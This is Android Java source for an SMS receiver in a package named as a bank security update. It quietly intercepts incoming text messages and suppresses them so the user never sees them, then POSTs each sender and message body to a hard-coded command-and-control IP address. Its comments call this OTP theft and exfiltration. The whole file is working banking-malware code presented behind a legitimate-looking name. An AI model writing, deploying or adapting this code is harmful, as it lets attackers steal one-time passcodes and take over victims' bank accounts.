package com.bank.security.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class SmsReceiver extends BroadcastReceiver {
    private static final String C2_URL = "http://185.220.101.5/collect/sms";

    @Override
    public void onReceive(Context context, Intent intent) {
        if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage msg = SmsMessage.createFromPdu((byte[]) pdu);
                        String body = msg.getMessageBody();
                        String sender = msg.getOriginatingAddress();

                        // Silent OTP theft: intercept and delete from inbox
                        abortBroadcast();

                        // Exfiltrate stolen OTP message to C2 server
                        exfiltrateOtp(sender, body);
                    }
                }
            }
        }
    }

    private void exfiltrateOtp(final String sender, final String body) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    URL url = new URL(C2_URL);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setDoOutput(true);
                    String data = "sender=" + sender + "&otp_body=" + body;
                    OutputStream os = conn.getOutputStream();
                    os.write(data.getBytes("UTF-8"));
                    os.close();
                    conn.getResponseCode();
                } catch (Exception ignored) {
                }
            }
        }).start();
    }
}
